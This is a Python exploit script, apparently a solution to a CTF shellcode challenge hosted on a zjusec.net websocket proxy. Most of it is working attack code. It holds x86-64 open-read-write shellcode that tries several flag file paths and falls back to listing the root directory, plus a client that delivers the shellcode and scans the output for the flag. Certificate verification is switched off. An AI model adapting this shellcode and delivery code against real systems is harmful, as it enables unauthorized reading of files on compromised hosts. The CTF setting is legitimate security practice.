
import sys
import time
import ssl

import websocket
from keystone import *

# ========== Configuration ==========
WS_URL = "wss://ctf.zjusec.net/api/proxy/019f59f2-1a4d-7c68-9602-0ede39782abd"


def ks_asm(code):
    """Assemble x86-64 using keystone engine"""
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, count = ks.asm(code)
    return bytes(encoding)


def make_orw_shellcode():
    """
    ORW shellcode that tries multiple flag paths:
    /flag -> flag -> /flag.txt -> /home/ctf/flag
    
    If all fail, lists root directory with getdents64.
    """
    code = """
        /* Save rsp */
        mov r15, rsp

        /* === Try /flag === */
        xor eax, eax
        push rax
        mov rax, 0x67616c662f
        push rax
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test rax, rax
        jge do_read
        add rsp, 16

        /* === Try flag (relative) === */
        xor eax, eax
        push rax
        mov rax, 0x67616c66
        push rax
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test rax, rax
        jge do_read
        add rsp, 16

        /* === Try /flag.txt === */
        xor eax, eax
        push rax
        mov rax, 0x7478742e
        push rax
        mov rax, 0x67616c662f
        push rax
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test rax, rax
        jge do_read
        add rsp, 24

        /* === Try /home/ctf/flag === */
        xor eax, eax
        push rax
        mov rax, 0x67616c662f
        push rax
        mov rax, 0x6674632f
        push rax
        mov rax, 0x656d6f682f
        push rax
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        test rax, rax
        jge do_read
        add rsp, 32

        /* === All flag paths failed, list "/" with getdents64 === */
        xor eax, eax
        push rax
        mov rax, 0x2f
        push rax
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 2
        syscall
        add rsp, 16
        test rax, rax
        jl all_done

        /* getdents64(fd, buf, 0x400) = syscall 217 */
        mov rdi, rax
        lea rsi, [r15 - 0x400]
        mov rdx, 0x400
        mov eax, 217
        syscall

        /* write(1, buf, rax) */
        mov rdx, rax
        mov edi, 1
        lea rsi, [r15 - 0x400]
        mov eax, 1
        syscall
        jmp all_done

    do_read:
        /* read(fd, buf, 0x200) */
        mov rdi, rax
        lea rsi, [r15 - 0x200]
        mov rdx, 0x200
        xor eax, eax
        syscall

        /* write(1, buf, rax) */
        mov rdx, rax
        mov edi, 1
        lea rsi, [r15 - 0x200]
        mov eax, 1
        syscall

    all_done:
        xor edi, edi
        mov eax, 60
        syscall
    """
    
    sc = ks_asm(code)
    print(f"[*] Shellcode size: {len(sc)} bytes (max 0x1000 = 4096)")
    return sc


def main():
    shellcode = make_orw_shellcode()
    print(f"[*] Shellcode hex: {shellcode.hex()}")
    
    if len(shellcode) > 0x1000:
        print("[-] Shellcode too large!")
        return

    # Connect to WebSocket
    print(f"[*] Connecting to {WS_URL}...")
    
    try:
        ws = websocket.create_connection(
            WS_URL,
            timeout=15,
            sslopt={"cert_reqs": ssl.CERT_NONE}  # Skip cert verification for CTF
        )
        print(f"[+] WebSocket connected!")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return

    # Receive prompt
    all_data = b""
    try:
        # Wait for "Give me your shellcode:" prompt
        deadline = time.time() + 10
        while time.time() < deadline:
            try:
                ws.settimeout(3)
                data = ws.recv()
                if isinstance(data, str):
                    data = data.encode()
                all_data += data
                print(f"[<] Received: {data}")
                if b"shellcode:" in all_data:
                    break
            except websocket.WebSocketTimeoutException:
                break
            except Exception as e:
                print(f"[!] Recv error: {e}")
                break
    except Exception as e:
        print(f"[!] Error receiving prompt: {e}")

    print(f"[*] Total received before send: {all_data}")
    
    # Send shellcode as binary
    print(f"[*] Sending {len(shellcode)} bytes of ORW shellcode...")
    try:
        ws.send_binary(shellcode)
        print("[+] Shellcode sent!")
    except Exception as e:
        print(f"[-] Send failed: {e}")
        ws.close()
        return

    # Receive output (flag)
    print("[*] Waiting for output...")
    all_output = b""
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            ws.settimeout(3)
            data = ws.recv()
            if isinstance(data, str):
                data = data.encode()
            all_output += data
            print(f"[<] ({len(data)} bytes): {data}")
        except websocket.WebSocketTimeoutException:
            if all_output:
                break  # Got some data, timeout means done
            continue
        except websocket.WebSocketConnectionClosedException:
            print("[*] Connection closed by server")
            break
        except Exception as e:
            print(f"[!] Recv error: {e}")
            break

    ws.close()
    
    # Print final output
    print("\n" + "=" * 60)
    print("OUTPUT:")
    print("=" * 60)
    try:
        text = all_output.decode('utf-8', errors='replace')
        print(text)
    except:
        print(all_output.hex())
    print("=" * 60)
    
    # Check for flag
    for pattern in [b'flag{', b'CTF{', b'FLAG{', b'ctf{', b'AAA{', b'ZJU{', b'zju{']:
        if pattern in all_output:
            idx = all_output.index(pattern)
            end = all_output.index(b'}', idx) + 1 if b'}' in all_output[idx:] else len(all_output)
            flag = all_output[idx:end].decode('utf-8', errors='replace')
            print(f"\n[+] FLAG FOUND: {flag}")
            break
    else:
        # Also check if output contains readable text that might be a flag
        print("\n[*] No standard flag pattern found. Check raw output above.")


if __name__ == '__main__':
    main()
